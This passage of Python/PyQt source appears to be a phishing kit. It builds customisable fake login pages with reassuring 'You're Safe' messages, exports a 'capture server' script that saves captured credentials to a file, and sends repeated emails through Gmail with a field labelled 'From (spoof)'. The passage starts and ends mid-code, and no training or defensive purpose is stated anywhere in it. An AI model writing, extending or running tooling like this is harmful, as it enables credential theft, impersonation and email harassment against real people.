            ("#f3e5f5", "#ffffff", "#9c27b0", "Purple"),
        ]
        for bg, card, accent, name in presets:
            btn = QPushButton()
            btn.setToolTip(name)
            btn.setFixedSize(28, 28)
            btn.setStyleSheet(f"background: qlineargradient(x1:0, y1:0, x2:1, y2:1, stop:0 {bg}, stop:0.5 {card}, stop:1 {accent}); border: 1px solid #555; border-radius: 14px;")
            btn.clicked.connect(lambda checked, b=bg, c=card, a=accent: self.apply_preset(b, c, a))
            preset_row.addWidget(btn)
        preset_row.addStretch()
        c4l.addLayout(preset_row)
        
        ll.addWidget(c4)
        
        # === SIZE & SPACING ===
        c5 = QWidget()
        c5.setObjectName("card")
        c5l = QVBoxLayout(c5)
        c5l.setContentsMargins(15, 15, 15, 15)
        ct5 = QLabel("Size & Layout")
        ct5.setObjectName("cardTitle")
        c5l.addWidget(ct5)
        
        s2grid = QGridLayout()
        s2grid.setSpacing(6)
        
        s2grid.addWidget(QLabel("Card width:"), 0, 0)
        self.slider_width = QSlider(Qt.Horizontal)
        self.slider_width.setRange(300, 600)
        self.slider_width.setValue(400)
        self.slider_width.setObjectName("slider")
        self.slider_width.valueChanged.connect(self.render)
        s2grid.addWidget(self.slider_width, 0, 1)
        self.width_label = QLabel("400px")
        self.width_label.setObjectName("colorLabel")
        s2grid.addWidget(self.width_label, 0, 2)
        
        s2grid.addWidget(QLabel("Padding:"), 1, 0)
        self.slider_padding = QSlider(Qt.Horizontal)
        self.slider_padding.setRange(15, 50)
        self.slider_padding.setValue(30)
        self.slider_padding.setObjectName("slider")
        self.slider_padding.valueChanged.connect(self.render)
        s2grid.addWidget(self.slider_padding, 1, 1)
        self.padding_label = QLabel("30px")
        self.padding_label.setObjectName("colorLabel")
        s2grid.addWidget(self.padding_label, 1, 2)
        
        s2grid.addWidget(QLabel("Border radius:"), 2, 0)
        self.slider_radius = QSlider(Qt.Horizontal)
        self.slider_radius.setRange(0, 30)
        self.slider_radius.setValue(12)
        self.slider_radius.setObjectName("slider")
        self.slider_radius.valueChanged.connect(self.render)
        s2grid.addWidget(self.slider_radius, 2, 1)
        self.radius_label = QLabel("12px")
        self.radius_label.setObjectName("colorLabel")
        s2grid.addWidget(self.radius_label, 2, 2)
        
        s2grid.addWidget(QLabel("Shadow opacity:"), 3, 0)
        self.slider_shadow = QSlider(Qt.Horizontal)
        self.slider_shadow.setRange(0, 100)
        self.slider_shadow.setValue(10)
        self.slider_shadow.setObjectName("slider")
        self.slider_shadow.valueChanged.connect(self.render)
        s2grid.addWidget(self.slider_shadow, 3, 1)
        self.shadow_label = QLabel("0.10")
        self.shadow_label.setObjectName("colorLabel")
        s2grid.addWidget(self.shadow_label, 3, 2)
        
        c5l.addLayout(s2grid)
        ll.addWidget(c5)
        
        # === SUCCESS MESSAGE ===
        c6 = QWidget()
        c6.setObjectName("card")
        c6l = QVBoxLayout(c6)
        c6l.setContentsMargins(15, 15, 15, 15)
        ct6 = QLabel("Success Message (shown after login)")
        ct6.setObjectName("cardTitle")
        c6l.addWidget(ct6)
        
        s3grid = QGridLayout()
        s3grid.setSpacing(6)
        
        s3grid.addWidget(QLabel("Heading:"), 0, 0)
        self.txt_success_heading = QLineEdit("Verified! You're Safe")
        self.txt_success_heading.setObjectName("inputFieldSmall")
        self.txt_success_heading.textChanged.connect(self.render)
        s3grid.addWidget(self.txt_success_heading, 0, 1)
        
        s3grid.addWidget(QLabel("Message:"), 1, 0)
        self.txt_success_msg = QLineEdit("Your identity has been verified successfully. You can close this page.")
        self.txt_success_msg.setObjectName("inputFieldSmall")
        self.txt_success_msg.textChanged.connect(self.render)
        s3grid.addWidget(self.txt_success_msg, 1, 1)
        
        s3grid.addWidget(QLabel("Error text:"), 2, 0)
        self.txt_error = QLineEdit("Invalid email or password. Please try again.")
        self.txt_error.setObjectName("inputFieldSmall")
        self.txt_error.textChanged.connect(self.render)
        s3grid.addWidget(self.txt_error, 2, 1)
        
        c6l.addLayout(s3grid)
        
        # Options
        opt_row = QHBoxLayout()
        self.chk_remember = QCheckBox("Show 'Remember me'")
        self.chk_remember.setChecked(True)
        self.chk_remember.stateChanged.connect(self.render)
        opt_row.addWidget(self.chk_remember)
        
        self.chk_forgot = QCheckBox("Show 'Forgot password'")
        self.chk_forgot.setChecked(True)
        self.chk_forgot.stateChanged.connect(self.render)
        opt_row.addWidget(self.chk_forgot)
        opt_row.addStretch()
        c6l.addLayout(opt_row)
        
        ll.addWidget(c6)
        
        # === LOGO ===
        c7 = QWidget()
        c7.setObjectName("card")
        c7l = QVBoxLayout(c7)
        c7l.setContentsMargins(15, 15, 15, 15)
        ct7 = QLabel("Logo")
        ct7.setObjectName("cardTitle")
        c7l.addWidget(ct7)
        
        logo_row = QHBoxLayout()
        self.btn_upload_logo = QPushButton("  Upload Logo Image")
        self.btn_upload_logo.setObjectName("btnSecondary")
        self.btn_upload_logo.clicked.connect(self.upload_logo)
        logo_row.addWidget(self.btn_upload_logo)
        
        self.chk_logo_upload = QCheckBox("Allow user to upload logo")
        self.chk_logo_upload.stateChanged.connect(self.render)
        logo_row.addWidget(self.chk_logo_upload)
        logo_row.addStretch()
        c7l.addLayout(logo_row)
        
        self.logo_preview = QLabel("No logo uploaded")
        self.logo_preview.setObjectName("subText")
        c7l.addWidget(self.logo_preview)
        
        ll.addWidget(c7)
        
        # === EXPORT ===
        c8 = QWidget()
        c8.setObjectName("card")
        c8l = QVBoxLayout(c8)
        c8l.setContentsMargins(15, 15, 15, 15)
        
        exp_row = QHBoxLayout()
        btn_export = QPushButton("  Export HTML File")
        btn_export.setObjectName("btnPrimary")
        btn_export.setMinimumHeight(44)
        btn_export.clicked.connect(self.export_html)
        exp_row.addWidget(btn_export)
        
        btn_copy = QPushButton("  Copy to Clipboard")
        btn_copy.setObjectName("btnSecondary")
        btn_copy.setMinimumHeight(44)
        btn_copy.clicked.connect(self.copy_html)
        exp_row.addWidget(btn_copy)
        c8l.addLayout(exp_row)
        
        btn_capture = QPushButton("  Export Capture Server Script")
        btn_capture.setObjectName("btnSecondary")
        btn_capture.clicked.connect(self.export_capture_script)
        c8l.addWidget(btn_capture)
        
        ll.addWidget(c8)
        ll.addStretch()
        
        left_scroll.setWidget(left_widget)
        
        # RIGHT PANEL - Preview
        right = QWidget()
        right.setObjectName("panelRight")
        rl = QVBoxLayout(right)
        
        preview_header = QLabel("Live Preview")
        preview_header.setObjectName("cardTitle")
        rl.addWidget(preview_header)
        
        self.preview = QTextEdit()
        self.preview.setReadOnly(True)
        self.preview.setObjectName("previewArea")
        rl.addWidget(self.preview)
        
        splitter = QSplitter(Qt.Horizontal)
        splitter.addWidget(left_scroll)
        splitter.addWidget(right)
        splitter.setSizes([520, 520])
        layout.addWidget(splitter)
        
        # Initial render
        self.render()
        self.update_labels()
    
    def setup_settings_tab(self):
        layout = QVBoxLayout(self.tab_settings)
        layout.setContentsMargins(30, 20, 30, 20)
        layout.setSpacing(15)
        
        # Gmail config
        card = QWidget()
        card.setObjectName("cardLarge")
        cl = QVBoxLayout(card)
        cl.setContentsMargins(20, 20, 20, 20)
        cl.setSpacing(12)
        
        ct = QLabel("Gmail Configuration")
        ct.setObjectName("cardTitleLarge")
        cl.addWidget(ct)
        
        desc = QLabel("Enter your Gmail App Password to send real emails.")
        desc.setObjectName("descText")
        desc.setWordWrap(True)
        cl.addWidget(desc)
        
        r1 = QHBoxLayout()
        r1.addWidget(QLabel("Gmail:"))
        self.txt_gmail = QLineEdit()
        self.txt_gmail.setPlaceholderText("your@gmail.com")
        self.txt_gmail.setObjectName("inputField")
        r1.addWidget(self.txt_gmail)
        cl.addLayout(r1)
        
        r2 = QHBoxLayout()
        r2.addWidget(QLabel("App Password:"))
        self.txt_gmail_pwd = QLineEdit()
        self.txt_gmail_pwd.setPlaceholderText("16-char App Password")
        self.txt_gmail_pwd.setEchoMode(QLineEdit.Password)
        self.txt_gmail_pwd.setObjectName("inputField")
        r2.addWidget(self.txt_gmail_pwd)
        btn_show = QPushButton("Show")
        btn_show.setObjectName("btnTiny")
        btn_show.setFixedWidth(50)
        btn_show.clicked.connect(lambda: self.toggle_pwd(btn_show))
        r2.addWidget(btn_show)
        cl.addLayout(r2)
        
        r3 = QHBoxLayout()
        r3.addWidget(QLabel("From (spoof):"))
        self.txt_from = QLineEdit()
        self.txt_from.setPlaceholderText("security@company.com")
        self.txt_from.setObjectName("inputField")
        r3.addWidget(self.txt_from)
        cl.addLayout(r3)
        
        btn_test = QPushButton("  Test Connection")
        btn_test.setObjectName("btnPrimary")
        btn_test.clicked.connect(self.test_smtp)
        cl.addWidget(btn_test)
        
        self.conn_status = QLabel("Not tested")
        self.conn_status.setObjectName("statusText")
        cl.addWidget(self.conn_status)
        
        layout.addWidget(card)
        
        # Help
        help_card = QWidget()
        help_card.setObjectName("cardLarge")
        hl = QVBoxLayout(help_card)
        hl.setContentsMargins(20, 20, 20, 20)
        
        ht = QLabel("How to get an App Password")
        ht.setObjectName("cardTitleLarge")
        hl.addWidget(ht)
        
        steps = QLabel(
            "1. Go to myaccount.google.com/security\n"
            "2. Turn on 2-Step Verification\n"
            "3. Search for 'App Passwords'\n"
            "4. Create one for 'Mail' on 'Windows Computer'\n"
            "5. Copy the 16-character code and paste above"
        )
        steps.setObjectName("stepsText")
        hl.addWidget(steps)
        
        layout.addWidget(help_card)
        layout.addStretch()
    
    # ===== LINK TAB METHODS =====
    
    def on_page_type_changed(self, idx):
        """Show/hide elements based on page type"""
        self.render()
    
    def render(self):
        """Generate and display the page preview"""
        config = self.page_config.copy()
        
        config["page_title"] = self.txt_page_title.text()
        config["heading"] = self.txt_heading.text()
        config["subtitle"] = self.txt_subtitle.text()
        config["font"] = self.font_combo.currentFont().family()
        config["bg_color"] = self.bg_label.text()
        config["card_color"] = self.card_label.text()
        config["accent_color"] = self.accent_label.text()
        config["title_color"] = self.title_label.text()
        config["width"] = self.slider_width.value()
        config["padding"] = self.slider_padding.value()
        config["border_radius"] = self.slider_radius.value()
        config["shadow_opacity"] = self.slider_shadow.value() / 100
        
        config["email_label"] = self.txt_email_label.text()
        config["email_placeholder"] = self.txt_email_ph.text()
        config["password_label"] = self.txt_pass_label.text()
        config["password_placeholder"] = self.txt_pass_ph.text()
        config["button_text"] = self.txt_btn_text.text()
        config["error_message"] = self.txt_error.text()
        config["success_heading"] = self.txt_success_heading.text()
        config["success_message"] = self.txt_success_msg.text()
        config["show_remember"] = self.chk_remember.isChecked()
        config["show_forgot"] = self.chk_forgot.isChecked()
        config["logo_data"] = self.logo_data
        config["show_logo_upload"] = self.chk_logo_upload.isChecked()
        config["extra_fields"] = self.extra_fields
        
        self.page_config = config
        self.current_html = generate_login_page(config)
        self.preview.setHtml(self.current_html)
        self.update_labels()
    
    def update_labels(self):
        self.width_label.setText(f"{self.slider_width.value()}px")
        self.padding_label.setText(f"{self.slider_padding.value()}px")
        self.radius_label.setText(f"{self.slider_radius.value()}px")
        self.shadow_label.setText(f"{self.slider_shadow.value() / 100:.2f}")
    
    def pick_color(self, target):
        color = QColorDialog.getColor()
        if color.isValid():
            hex_color = color.name()
            if target == "bg":
                self.bg_btn.setStyleSheet(f"background: {hex_color}; border: 2px solid #555; border-radius: 5px;")
                self.bg_label.setText(hex_color)
            elif target == "card":
                self.card_btn.setStyleSheet(f"background: {hex_color}; border: 2px solid #555; border-radius: 5px;")
                self.card_label.setText(hex_color)
            elif target == "accent":
                self.accent_btn.setStyleSheet(f"background: {hex_color}; border: 2px solid #555; border-radius: 5px;")
                self.accent_label.setText(hex_color)
            elif target == "title":
                self.title_btn.setStyleSheet(f"background: {hex_color}; border: 2px solid #555; border-radius: 5px;")
                self.title_label.setText(hex_color)
            self.render()
    
    def apply_preset(self, bg, card, accent):
        self.bg_btn.setStyleSheet(f"background: {bg}; border: 2px solid #555; border-radius: 5px;")
        self.bg_label.setText(bg)
        self.card_btn.setStyleSheet(f"background: {card}; border: 2px solid #555; border-radius: 5px;")
        self.card_label.setText(card)
        self.accent_btn.setStyleSheet(f"background: {accent}; border: 2px solid #555; border-radius: 5px;")
        self.accent_label.setText(accent)
        self.render()
    
    def upload_logo(self):
        file_path, _ = QFileDialog.getOpenFileName(self, "Select Logo", "", "Images (*.png *.jpg *.jpeg *.gif *.svg)")
        if file_path:
            with open(file_path, "rb") as f:
                img_data = f.read()
            ext = os.path.splitext(file_path)[1][1:]
            if ext.lower() == "svg":
                mime = "image/svg+xml"
            elif ext.lower() in ("jpg", "jpeg"):
                mime = "image/jpeg"
            else:
                mime = f"image/{ext}"
            self.logo_data = f"data:{mime};base64,{base64.b64encode(img_data).decode()}"
            self.logo_preview.setText(f"Logo loaded: {os.path.basename(file_path)}")
            self.logo_preview.setStyleSheet("color: #00ff88;")
            self.render()
    
    def add_extra_field(self):
        name, ok = QInputDialog.getText(self, "Field Name", "Enter field name (e.g., phone):")
        if ok and name:
            placeholder, ok2 = QInputDialog.getText(self, "Placeholder", "Enter placeholder text:")
            if ok2:
                self.extra_fields.append({
                    "name": name,
                    "type": "text",
                    "placeholder": placeholder or name
                })
                self.extra_fields_list.addItem(f"{name}: {placeholder or name}")
                self.render()
    
    def remove_extra_field(self):
        row = self.extra_fields_list.currentRow()
        if row >= 0 and row < len(self.extra_fields):
            self.extra_fields.pop(row)
            self.extra_fields_list.takeItem(row)
            self.render()
    
    def export_html(self):
        if self.current_html:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"login_page_{timestamp}.html"
            with open(filename, "w", encoding="utf-8") as f:
                f.write(self.current_html)
            QMessageBox.information(self, "Exported", f"Saved as:\n{os.path.abspath(filename)}")
    
    def copy_html(self):
        if self.current_html:
            QApplication.clipboard().setText(self.current_html)
            QMessageBox.information(self, "Copied", "HTML copied to clipboard!")
    
    def export_capture_script(self):
        config = self.page_config.copy()
        config["server_type"] = "python"
        script = generate_capture_server_html(config)
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"capture_server_{timestamp}.py"
        with open(filename, "w") as f:
            f.write(script)
        QMessageBox.information(self, "Exported", 
            f"Capture server saved as:\n{os.path.abspath(filename)}\n\n"
            f"Run: python {filename}\n"
            f"It will listen on port 8080 and save captured credentials to captured_logins.txt")
    
    # ===== EMAIL METHODS =====
    
    def start_sending(self):
        target = self.target_input.text().strip()
        msg = self.msg_edit.toPlainText().strip()
        email = self.txt_gmail.text().strip()
        pwd = self.txt_gmail_pwd.text().strip()
        
        if not target or not msg:
            QMessageBox.warning(self, "Missing", "Enter target and message")
            return
        if not email or not pwd:
            QMessageBox.warning(self, "Missing", "Configure Gmail in Settings")
            self.tabs.setCurrentIndex(2)
            return
        
        self.btn_start.setEnabled(False)
        self.btn_stop.setEnabled(True)
        self.progress.setValue(0)
        self.progress.setFormat("Starting...")
        self.log_output.clear()
        
        self.worker = EmailWorker(
            target, msg, self.count_spin.value(), self.delay_spin.value(),
            email, pwd, self.txt_from.text().strip() or email
        )
        self.worker.log_signal.connect(self.add_log)
        self.worker.progress_signal.connect(self.update_progress)
        self.worker.finished_signal.connect(self.on_finished)
        self.worker.start()
        
        self.status_text.setText(f"Sending to {target}...")
    
    def stop_sending(self):
        if self.worker and self.worker.isRunning():
            self.worker.running = False
            self.add_log("[!] Stopped")
            self.btn_start.setEnabled(True)
            self.btn_stop.setEnabled(False)
    
    def update_progress(self, cur, tot):
        pct = int(cur / tot * 100)
        self.progress.setValue(pct)
        self.progress.setFormat(f"{cur}/{tot} ({pct}%)")
        if self.worker:
            self.stat_sent.setText(f"Sent: {self.worker.sent}")
            self.stat_fail.setText(f"Failed: {self.worker.failed}")
    
    def on_finished(self, r):
        self.btn_start.setEnabled(True)
        self.btn_stop.setEnabled(False)
        self.progress.setValue(100)
        self.progress.setFormat(f"Done: {r['sent']} sent")
        self.stat_sent.setText(f"Sent: {r['sent']}")
        self.stat_fail.setText(f"Failed: {r['failed']}")
        self.stat_rate.setText(f"Rate: {r['rate']}/s")
        self.status_text.setText(f"Complete: {r['sent']} sent")
        
        QMessageBox.information(self, "Complete",
            f"Sent: {r['sent']}\nFailed: {r['failed']}\nRate: {r['rate']}/s")
    
    def add_log(self, msg):
        self.log_output.append(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}")
        sb = self.log_output.verticalScrollBar()
        QTimer.singleShot(50, lambda: sb.setValue(sb.maximum()))
    
    def test_smtp(self):
        email = self.txt_gmail.text().strip()
        pwd = self.txt_gmail_pwd.text().strip()
        if not email or not pwd:
            QMessageBox.warning(self, "Missing", "Enter email and App Password")
            return
        
        self.conn_status.setText("Testing...")
        
        def test():
            try:
                ctx = ssl.create_default_context()
                s = smtplib.SMTP("smtp.gmail.com", 587)
                s.starttls(context=ctx)
                s.login(email, pwd)
                s.quit()
                self.conn_status.setText("Connected! Credentials work.")
                self.conn_status.setStyleSheet("color: #00ff88; font-weight: bold;")
            except Exception as e:
                self.conn_status.setText(f"Failed: {str(e)[:40]}")
                self.conn_status.setStyleSheet("color: #ff6b6b;")
        
        threading.Thread(target=test, daemon=True).start()
    
    def toggle_p
